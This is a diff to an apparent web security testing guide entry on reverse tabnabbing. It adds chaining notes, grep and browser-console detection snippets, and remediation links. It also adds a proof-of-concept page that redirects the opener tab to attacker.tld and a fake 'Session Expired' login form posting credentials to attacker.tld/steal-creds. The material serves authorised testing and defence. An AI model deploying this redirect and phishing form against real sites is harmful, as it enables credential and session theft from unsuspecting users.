@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-01, wstg-clnt-01.1]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-01: "Reverse Tabnabbing + DOM XSS = instead of redirecting window.opener to an off-domain phishing clone, attacker redirects it to a crafted {target} URL carrying the XSS payload — the address bar still shows the real, trusted domain while the script executes in the real origin, making the attack far more convincing and yielding actual session theft rather than just credential phishing (Medium -> High)"
 ---
 
 # wstg-clnt-14
@@ -384,6 +385,92 @@ tester.run_tests()
 
 ---
 
+## Example Commands/Payloads
+
+### Find unprotected target="_blank" links
+
+```bash
+curl -s "https://{target}" | grep -oP '<a[^>]*target=["\047]_blank["\047][^>]*>' \
+  | grep -v 'rel=["\047][^"\047]*noopener'
+```
+
+### Reverse tabnabbing PoC page (attacker.tld/index.html — the tab opened by target="_blank")
+
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Interesting Article</title></head>
+<body>
+  <script>
+    if (window.opener) {
+      window.opener.location = "https://attacker.tld/phishing-login.html"
+    }
+  </script>
+</body>
+</html>
+```
+
+### Fake login page served at the redirect target
+
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Session Expired - Please Login</title></head>
+<body>
+  <h1>Your session has expired</h1>
+  <form action="https://attacker.tld/steal-creds" method="POST">
+    <input type="text" name="username" placeholder="Username" />
+    <input type="password" name="password" placeholder="Password" />
+    <button type="submit">Login</button>
+  </form>
+</body>
+</html>
+```
+
+### window.open() vulnerable-pattern grep
+
+```bash
+curl -s "https://{target}" | grep -oP 'window\.open\([^)]+\)' | grep -vi noopener
+```
+
+### Detect empty/missing `rel` on `target="_blank"` links (PayloadsAllTheThings discovery pattern)
+
+Both an empty `rel=""` and a completely absent `rel` attribute are vulnerable — grep for both forms, not just "noopener missing":
+
+```bash
+curl -s "https://{target}" | grep -ozP '<a\s[^>]*target=["\x27]_blank["\x27][^>]*>' \
+  | grep -zoP '<a(?!.*rel=["\x27][^"\x27]*noopener)[^>]*>'
+```
+
+### Runtime detection of dynamically-injected vulnerable links (SPA/framework-rendered anchors)
+
+Static HTML grep misses anchors a JS framework injects after page load. Run this in the browser console (or as a Burp/DOM Invader custom script) to catch those too:
+
+```javascript
+new MutationObserver((mutations) => {
+  mutations.forEach((m) =>
+    m.addedNodes.forEach((n) => {
+      if (n.nodeType !== 1) return
+      const links = n.matches?.('a[target="_blank"]') ? [n] : n.querySelectorAll?.('a[target="_blank"]') || []
+      links.forEach((a) => {
+        if (!(a.getAttribute("rel") || "").includes("noopener")) {
+          console.log("[!] Dynamically-added vulnerable link:", a.href)
+        }
+      })
+    })
+  )
+}).observe(document.body, { childList: true, subtree: true })
+```
+
+### Burp extension for automated discovery
+
+```
+Install "Discovering Reverse Tabnabbing" from the BApp Store - it passively flags every
+target="_blank" link missing rel="noopener" while you browse {target} normally.
+```
+
+---
+
 ## Remediation
 
 ```html
@@ -486,6 +573,7 @@ document.addEventListener("DOMContentLoaded", function () {
 - [OWASP Testing Guide - Reverse Tabnabbing](https://owasp.org/www-project-web-security-testing-guide/)
 - [MDN - Link types: noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types/noopener)
 - [Mathias Bynens - Reverse Tabnabbing](https://mathiasbynens.github.io/rel-noopener/)
+- [PayloadsAllTheThings - Tabnabbing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tabnabbing)
 
 
 ---
